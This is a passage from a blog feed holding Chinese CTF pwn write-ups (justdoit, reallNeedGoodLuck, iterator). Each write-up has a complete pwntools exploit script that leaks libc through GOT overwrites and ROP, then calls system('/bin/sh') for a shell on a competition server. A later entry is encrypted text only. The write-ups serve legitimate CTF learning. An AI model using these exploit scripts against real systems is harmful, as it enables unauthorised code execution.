class="number">0</span></span><br><span class="line">elf=<span class="string">'./justdoit'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'47.106.172.144'</span>,<span class="number">65004</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x00000000004012b3 : pop rdi ; ret</span></span><br><span class="line"><span class="comment">#0x404018 &lt;puts@got.plt&gt;:        0x00007f459ba23210      0x00007f459ba04dc0</span></span><br><span class="line"><span class="comment">#0x404028 &lt;read@got.plt&gt;:</span></span><br><span class="line"><span class="comment">#main  0x4011d5</span></span><br><span class="line">p.recvuntil(<span class="string">'Hi there! What is your name?'</span>)</span><br><span class="line">p.send(p64(<span class="number">0x00000000004012b3</span>)+p64(<span class="number">0x4011d5</span>)+p64(<span class="number">0x4011d5</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'-40'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Hi there! What is your name?'</span>)</span><br><span class="line"><span class="comment">#0x40123e</span></span><br><span class="line">p.send(p64(<span class="number">0x00000000004012b3</span>)+p64(<span class="number">0x4011d5</span>)+p64(<span class="number">0x4011d5</span>))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'-40'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Hi there! What is your name?'</span>)</span><br><span class="line">p.send(p64(<span class="number">0x00000000004012b3</span>)+p64(e.got[<span class="string">'read'</span>])+p64(e.sym[<span class="string">'puts'</span>]))</span><br><span class="line">debug()</span><br><span class="line">p.sendline(<span class="string">'-40'</span>)</span><br><span class="line"></span><br><span class="line">addr=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(hex(addr))</span><br><span class="line">x=finder(<span class="string">'read'</span>,addr)</span><br><span class="line"></span><br><span class="line">p.send(p64(<span class="number">0x00000000004012b3</span>)+p64(x.dump(<span class="string">'str_bin_sh'</span>))+p64(x.dump(<span class="string">'system'</span>)))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'-40'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="reallNeedGoodLuck"><a href="#reallNeedGoodLuck" class="headerlink" title="reallNeedGoodLuck"></a>reallNeedGoodLuck</h3><p>分析程序流发现，在进行任意地址覆盖写时。除了<code>exit</code>函数外的libc函数，都已经延迟绑定完毕。而我们只能覆盖4个字节，单纯操作难以直接修改任何libc为<code>system</code>，同时发现程序流有<code>exit</code>函数来控制结束 ,所以只能先覆盖exit函数来控制程序流。继续审计程序代码发现，在我们通过劫持 <code>exit</code> 函数再次进入程序流时   <code>init</code>函数作用可有可无，同时  <code>init</code>函数中的<code>setvbuf</code>函数不仅got地址可以被我们劫持,第一个参数<code>stdin</code>也受我们控制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0000000000401166                 public init</span><br><span class="line">.text:0000000000401166 init            proc near               ; CODE XREF: main+1C↓p</span><br><span class="line">.text:0000000000401166 ; __unwind &#123;</span><br><span class="line">.text:0000000000401166                 push    rbp</span><br><span class="line">.text:0000000000401167                 mov     rbp, rsp</span><br><span class="line">.text:000000000040116A                 mov     rax, cs:stdin@GLIBC_2_2_5  &#x2F;&#x2F; puts.got</span><br><span class="line">.text:0000000000401171                 mov     ecx, 0          ; n</span><br><span class="line">.text:0000000000401176                 mov     edx, 2          ; modes</span><br><span class="line">.text:000000000040117B                 mov     esi, 0          ; buf</span><br><span class="line">.text:0000000000401180                 mov     rdi, rax        ; stream</span><br><span class="line">.text:0000000000401183                 call    _setvbuf&#x2F;&#x2F; puts</span><br><span class="line">.text:0000000000401188                 mov     rax, cs:__bss_start</span><br><span class="line">.text:000000000040118F                 mov     ecx, 0          ; n</span><br><span class="line">.text:0000000000401194                 mov     edx, 2          ; modes</span><br><span class="line">.text:0000000000401199                 mov     esi, 0          ; buf</span><br><span class="line">.text:000000000040119E                 mov     rdi, rax        ; stream</span><br><span class="line">.text:00000000004011A1                 call    _setvbuf</span><br><span class="line">.text:00000000004011A6                 nop</span><br><span class="line">.text:00000000004011A7                 pop     rbp</span><br><span class="line">.text:00000000004011A8                 retn</span><br><span class="line">.text:00000000004011A8 ; &#125; &#x2F;&#x2F; starts at 401166</span><br><span class="line">.text:00000000004011A8 init            endp</span><br></pre></td></tr></table></figure><p>因此我们先劫持<code>exit</code>让其跳转到执行完<code>init</code>函数处即<code>0x0000000004011CA</code>位置。然后修改<code>setvbuf</code>函数为<code>puts</code>函数。再将<code>stdin</code>地址改<code>puts</code> got 地址与劫持<code>exit</code>函数为完整<code>mian</code>函数来泄露出真实地址。(其实直接<code>stdin</code>,就可以泄露出，但本地环境中常泄露出截断符)</p><p>然后再将<code>atoi</code>函数劫持为<code>system</code>，再传入<code>/bin/sh\x00</code>即可以getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/12/04 14:33:30</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> * <span class="comment">#https://github.com/lexsd6/LibcSearcher_plus</span></span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./reallNeedGoodLuck.1'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'47.106.172.144'</span>,<span class="number">65003</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"><span class="comment">#0x404018 &lt;puts@got.plt&gt;:</span></span><br><span class="line"><span class="comment">#0x404038 &lt;exit@got.plt&gt;:</span></span><br><span class="line"><span class="comment">#0x404030 &lt;atoi@got.plt&gt;:</span></span><br><span class="line"><span class="comment">#0x00000000004012b3 : pop rdi ; ret</span></span><br><span class="line"><span class="comment"># 0x00404100</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(addr,date)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'good'</span>)</span><br><span class="line">    p.send(p32(date))</span><br><span class="line">    p.recvuntil(<span class="string">'luck! '</span>)</span><br><span class="line">    p.sendline(str(addr))</span><br><span class="line"></span><br><span class="line">main_addr_a=<span class="number">0X0000000004011CA</span></span><br><span class="line">main_addr=<span class="number">0x0000000004011A9</span></span><br><span class="line"></span><br><span class="line">edit(e.got[<span class="string">'exit'</span>],main_addr_a)</span><br><span class="line"><span class="comment">#00000000004011D4 </span></span><br><span class="line"><span class="comment">#0x00000000004012b3</span></span><br><span class="line"><span class="comment">#exit   0x404038</span></span><br><span class="line"></span><br><span class="line">edit(e.sym[<span class="string">'stdin'</span>],e.got[<span class="string">'puts'</span>])</span><br><span class="line">edit(e.sym[<span class="string">'stdin'</span>]+<span class="number">4</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit((e.got[<span class="string">'setvbuf'</span>]),(e.plt[<span class="string">'puts'</span>]))</span><br><span class="line">edit((e.got[<span class="string">'setvbuf'</span>] + <span class="number">4</span>),(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line">edit(e.got[<span class="string">'exit'</span>],main_addr)</span><br><span class="line"><span class="comment">#p.recvline()</span></span><br><span class="line">p.recvline()</span><br><span class="line">addr=u64(p.recvuntil(<span class="string">'\x7f'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(hex(addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x=finder(<span class="string">'puts'</span>,addr)</span><br><span class="line"><span class="comment">#edit(e.got['exit'],main_addr_a)</span></span><br><span class="line"></span><br><span class="line">p.send(p32(main_addr_a))</span><br><span class="line">p.recvuntil(<span class="string">'luck! '</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x404038</span>))</span><br><span class="line"></span><br><span class="line">system_addr=x.dump(<span class="string">'system'</span>)</span><br><span class="line">log.info(hex(system_addr))</span><br><span class="line"></span><br><span class="line">edit(e.got[<span class="string">'atoi'</span>],u32(p64(system_addr)[:<span class="number">4</span>]))</span><br><span class="line"></span><br><span class="line">edit(<span class="string">'/bin/sh\x00'</span>,main_addr_a)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="iterator"><a href="#iterator" class="headerlink" title="iterator"></a>iterator</h3><p>在overwrite功能在修改变量大于原数量时，修改数据会越界。把下个chuck数据修改，加个PIE未开，可以劫持got表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/12/05 09:53:58</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./iterator'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'47.106.172.144'</span>,<span class="number">65001</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">add</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'List count:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    <span class="comment">#print(p.recvline())</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ow</span><span class="params">(listn,st,ed,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'List id:'</span>)</span><br><span class="line">    p.sendline(str(listn))</span><br><span class="line">    p.recvuntil(<span class="string">'Star id:'</span>)</span><br><span class="line">    p.sendline(str(st))</span><br><span class="line">    p.recvuntil(<span class="string">'End id:'</span>)</span><br><span class="line">    p.sendline(str(ed))</span><br><span class="line">    p.recvuntil(<span class="string">'New number:'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(li,it)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'List id:'</span>)</span><br><span class="line">    p.sendline(str(li))</span><br><span class="line">    p.recvuntil(<span class="string">'Item id:'</span>)</span><br><span class="line">    p.sendline(str(it))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showall</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(li,it,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'List id:'</span>)</span><br><span class="line">    p.sendline(str(li))</span><br><span class="line">    p.recvuntil(<span class="string">'Item id:'</span>)</span><br><span class="line">    p.sendline(str(it))</span><br><span class="line">    p.recvuntil(<span class="string">'New number:'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0</span>,<span class="string">'4'</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0</span>,<span class="string">'2'</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">1</span>,<span class="string">'3'</span>)</span><br><span class="line">showall()</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0</span>,<span class="string">'111111'</span>)</span><br><span class="line">ow(<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,str(<span class="number">1</span>))</span><br><span class="line">ow(<span class="number">0</span>,<span class="number">4</span>,<span class="number">4</span>,str(e.got[<span class="string">'atoi'</span>]))</span><br><span class="line">show(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Number:'</span>)</span><br><span class="line">addr=int(p.recvline())</span><br><span class="line">log.info(hex(addr))</span><br><span class="line">x=finder(<span class="string">'atoi'</span>,addr)</span><br><span class="line">debug()</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0</span>,str(x.dump(<span class="string">'system'</span>)))</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;第一次吃到东软的瓜，虽然是大连东软的(老NSUer气抖冷)……</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HTB-cosy_casino-pwn-challenge-wp</title>
    <link href="lexsd6.github.io/2021/12/03/cosy-casino-pwn-challenge-wp/"/>
    <id>lexsd6.github.io/2021/12/03/cosy-casino-pwn-challenge-wp/</id>
    <published>2021-12-03T06:45:50.000Z</published>
    <updated>2021-12-07T05:42:18.847Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="634453b67a2dc9922f2f9067eb2e9faafb242fe779c69d53bfd6369318030d94">05f7089c65b602f54cf031d72ba324f293b950b9438ba0d2fd827b4331041d15e8674cc7493b8ea9e85ff9eb586cfcd56a1da5b355e3f45a7bc40f886778bb1c62db5c7980f7a359b8081f607cbc98b672299e4ab95bb42a9e574ce84ab73a186fd55f09e34cd89d707a86fea10ab928df695a9f8d04cf6bcefbc1e28270fbe8b4edddfa844c5e9dae131c44340af221f627810201d8400c4b621e3b2c9825dbe23524d9039e8d3a9a72a0ceeab452859df12c4f611ff81a8aef74551af8b293f12402ed3ea388dfe2e18da0a671a145c983f1909270dd4d81a11672c8dad8f6a01a94cc9818234042bfe8d8fc6e62afe9832679b497fb008b81ed49119a6d0bf3c23ea49f16b246f75bbedc9c654a5a2197d18f9514a82816947c84115d52de0676a958fba36ff4cc66d0cd997d489b931e1fc0b54827f64e711198e2f80c9f496310a043224c339ba2ae908d08e6ea103a34f7afe47c30aa3335a832c66d7c33cf45047caa816f71b56a4674eb11e913be1e83338ebe292601ef6acf9177f8ead2872f6799b597391a6c4c7b661771ee3bb1109de0b8edb558f87d8df34b103ee3aacda5301b20a0fe2ce03653c3475ea1524ce39dafe0b5b45dd20d03daaa47f83c67287b0261aa003040e3c3e94b4319586431a6bd0c771d23de1c178fa57a5bf06f72a10600d0af7943385a9dc1c172882c84f308ba01dbb2b0ee7c132b8587ae5fe04052b182b9296635d9a86ea7508f3601d383fd1a17323fc75b42787bc52e9b51da287c05f142ea53e6bfb4fa1ff7e5c77e68d1bb63034f98c82534a7a681bfbe3dea564b8d5fc7fc65b00b885a0d7111fb3ca4dd6c67d0dd6e7c433796d5df6e988fc20086e1523559a1da03659181537dac3ab40114cbb378d64c55dde352d0be0797a87a69e739e42a0cdcdaf5420b44de39a672f471eea5ad512a08fae09f70e51f31c06e9e6a6ad7cbc955a852d623a24e0ab90c053e90bbf7082155abda9e4323099e8c5d48f9d5c9a9b3d67f69d8b02f5f892053256d8edb05d1b0ed4e212b9b5c06845eba66a0d60fc8c749369ad37fce51b644a4e93fe8c73130dfbb4ae82a5e23b2d306d358bc03a813b1c4712d298f56316b43406ba3eb682657ef04ab455e886315df9f0dacf0d5d12dacb35881d05424f6dc3983a28aa105e195a764ab301e42602f8bf7230a35e7d51a194d909d612964a5bb470e89c29e564011c66e48480bc55624bf326bdae148cf21786f1c60c62f8fb4807924bbd1d7a62b01023ec5677adab59ad9f69da34525c64923ac23b69c486d0ce6c617799f4d4620d28d5b5f5a96ba674cd68391baeb5398bf2162c654869fab313fb7ebc5526a86ce87d1655545b79b91b6ff236e12d8d4926d1351f633f2f8027cb1fe8f3d75c4b93230951809e90adfe05d2a984ca1b1b1e01788a89aa38f02590217de0a8b6ac45fe95cdd13d92513bd54dd36c8c60a3aaaaadd9c08e7daeffd00e3d9c49f75065c565f7cfeebddcad1a191a016d1a985416398c94f76c6adbf5a57268cef90709eb490727380ebaaec3a8fe4c0eec6f9a6bef27a185a694c69077c74bd89634832edb380310e831d260d15a7aaa4d8a1b579abedf89d0a06b0715178eabfd72565f350c8315d8b3446c977158d77cc7c23043d5bd87428e70bb70ef8f9e09413a2eb9fa272bb8b32a2645a07a9386ca570e98a9ad6c4e315f6afde7cdd9ae2affaa096299f868f890f648a81d1c0832bd2ede9ad00d85c4f09c0dcd932b7cd1bd5582c7bd7ec7feab4b463f78702d9d7effd46c762b6ada3841580a599ff7c50790f74fd62c1857ca8eaeddf89894b9824e75f2353d86b20a3b000b80cf9e8ae4429114e8fdaa74eb06f85191de87b95b09f19093a50142e80c3f1397a8ce7e1db576f59dff8d7cd8951a953f78c51637cdcfd3f33c5872095883fd3508690a1a9f449aac61ed52aa811d0e9cd6d03ec6e574040aaddef0cecdb095244d8e319c2cc3ca25d5bdbb765727e24ddfd3259f9fe7b5594823d4909ae54c05f7cfd70416cb9c77a9f0a57f14470e1149db56cb9eaa94a70068d9117b0cbd8aa7ddb55ffe619d184bef7bbb096a82e43139c37aef38d0f1a5ca1760391bee95000ea2188c29b8990525a1f219608b9aa00640de79fe643a4cf845210f422f4d871d6616f01b8882374e0d32c3ed30fe53bc00b91cf2973921cff0ad34d1e3e6ea3b9473323fdfb7ae2f90fe089d3346c655d50185ad745f6d9a11177de431211bb4895179eb1e2419b9612c635b041b79886e55b83ff1a6f47539bbc05bd83de64ceb98d1957badee40c7e5b6f452dc2e49f5d7386655e209cf31e312c16929c36d12aff05fd85f03c37339721c80dc52988647fd90f13d6a78ac9467b047be3f3ca4cdac4d8af708db42a5cdff978e67d663b713a15ed62c80634cc560e337980f7c5c55f1605f6014b1f6bdb8abb47c1547c45ad0b1a3c076a7e9bbf74bbf494e69f7036d4a9bb83d3948275c4999889d92cd69272fa2a6fde34d73dc5fe7ccbf53da88871915d89af4b199efc657f11eb011973c00e8997433a8d5eb1499f73768b8c6e54a661d6cf96b2e8626131069a1757c3cfc296a3d46ed9c5e83a6d68392d3f4719d23d1f0be7ae39d50d4c96fe28c94b5c9d056153348f14ef47cec5bb35f53bb92d067c473d80a409cb4efa5f72d029cd6cc02a1f517360ebaaf2286e8828ea1a47e1dee76993d5905e04251aca4274dc5da169ff26086b2f50f8769991bf57eb7c8b5fc47141be7b856b0a06a8be99d7087895307f89c5ce1e583bbb9cd28929e63db83bf192528329e5bb4a69a6e6082ec9ff8e20c622912691d2e8257bac11378258dfed8da39e70a2ad3ebd87581304433c8365787eca427f30e8a52c748004ce2d7d44417b123bea4b6e6f7c185abcd213ee048b0b2ed6053f27ec3bc3d8cbaad5cce7ffb1f0056dbb675c1699b50e3ff382c776f3f16295b9d1034ce8f13c95a0411459f3d2942325d200ae2f8f4d46b05d403af6dd4e0b8e42da57fefc38b949e516d52c73c97e2ed67cab7d4449f4c2eed2cce64ccbc3473cda2b03d8ad390f1d41a8b79c32e24079128ec645871e57afcbd5c58d29c159bd9fcddef4199c61f4c20b97cb0bffc219af6fdb87ea3125dfecefc1f23df3d4f196ec04592316e4075b015de2357a562527b198f73ed31051b4cf6c2026ad3bd271464df858b34f2e14507427fef7470c4c84712d371ebba249bcb51d0c946d371d1f03c3ffbc07760e135373959a1e5c443d1d82480148923005463de9030a031035f350a2bd00b4caaaa6a0a8604555b577b128c513809cb13735aad0471f67bbd718a9ae1ef8e9770d117b740276f60f94abc3fbe4609363bd0edbc94cd7ad9878935be7dfbaf07d1fa9d4b14abaa23a85207b491003a753d2b8e74f9b933a632feb74a78751071503970ba028f124088fabe097d7b3d27b99536657cb9e25a2fa6d41a0978440e0a71ba83352473605c325799e66f2942df610175a24260c82b54671f1a29f844f44a1fb9e2536c32dca5bbc311f03d6caa43ec6c98c9c0cf9eebcf2e458951249a3ad0709f6aabfb53c90cc1a2f339ed617e96c3f055de3eef8922686f23412e2a3d7acdf99fcacf254addfdf32635d2ae71e82496382bcbca46e6feb15e55f2018a13fff7d41722f74198fff4f74e3d3bff78db30337511bd7bd4c9104fc5e3d4cb2d0b5eeeaa31d5b6a16b9b2461b6d92ffeb11512aaadb780ee6d79ce9e2702141b2da7fce9dcc6f0fbd7a0679f4c8e948d3ce378ffb0fd1b98ddf6f53a5b8ae9ae5e5237e7760997ccd952e842050ef284d76e5c68c1634743eefc3df85111589e98559bbe443f6778b6ee9b532f0766d48cc09fabc8e7ee5419d025d3d627fb3a3cd954dd70b44c3233cd9820a60d33970927b585f484714d37ebab5641c70c766ecb72f0d8b105c18348a6e3fe5c225321070a50efd6775800b7dd6d717defd3f1736786452d65df45dda9a28e8681192b32f5abad22c8b682f5ea29d7b635538437e370a88432eff6b4e70df8345605cff1c6da340c0512fdedf434b7795814be89abfccae3b7f592a4bf80f36f3f31ad905e4dbe333f83fefb5a0474179340f65a64f0d8c6cbcd3bda37ad962b0938dc35f69ea0b55a61fdd89b52f94da31accfe511e68a7bcdc95c57de147b35034e008e29c032be8cc6afcc4c116b2d4252e2fcfe1a96550bfd3d6d7c07fa067aaefc1809d1150fbe76e949b9732a84c66d1e23b9cd9c0f5220e1de2be6e7f4ead4e81b68d40d4b2821aafac5af1feca7aaf94eaaa4781ebfacadf15c15700c9dd8e26abd1627f238604295e0039e7dab5b8f7f100e65eac206a652c141f794dc4c0c025254d5f9475d3646507c61ea754ff51af71d35287e3f65213f5b7a44c88acec23c89d898eb8909184ffa893fa5c93a3816e082bba057fc0d0a7ef37116c4e52b20b7a41caf0222cbe3f621af51d8808f1ddd17e9e456d69c2d0405aa9bc8aa3c9191297e52fe3ba6990035b520b6a3c3438992201e7923f96c24aacf4beea4dd699482adb51cfbb31baabb3a81f187088eef09b612fedb18a52cfb136a7d90b48913ed5279a4d3db662896defe12a9a20b0759b91e0b1e260478d2c220e255cb5b28c4c7f37b579b5940a13cfdc45734b77ee30826a46a05d086682c70ee0ab850646a5ac44e58adc537c23eced9a86cfaeb891152e71a0f6f323a2dcb4d5a45d957b9bdf63c8cfa57a0e6bc109e430780d28a0301f83bebc4f61bf56a83bd4581145d59c1e1ceefe2294db562a1bc09b3afb5f4d8464c3d5048569ee67c0066b2ee6d689864a5c6711fe4a4bd59380602e589797594af213f0d47fbf4e26a3f29f82f8f4bc2b52d70812534a81264e1afcfd0f7374308bd118020b7b3c81095849a03d91f08808facba9e6b74873e4ad6468d67e3aa19f622dce9ff650629f61c019c933c8ba8940171e324735a70a4235a200dd045f011a533e007a5a5c16d902e82bcfa8d5857e0d11b37a71c1e9adf87a9136b023e0b21cf6fd66eb4d95d465806abb2e01a2c738df553710d72fff00d32aac83a3c82465b0446c5cd3cd1797e15eedec1a32d9737b1e019744310d800895220da67ec87bb244c4cd9a7bf97b8d11de1145579e2aa5d8205e19058c134ac60a253017b3ab68facb5b86167945bef443cb6b9c0c3f47e6440a864b7928ee031565bb3639abe53f0e5160be0988769f83ace3bcec1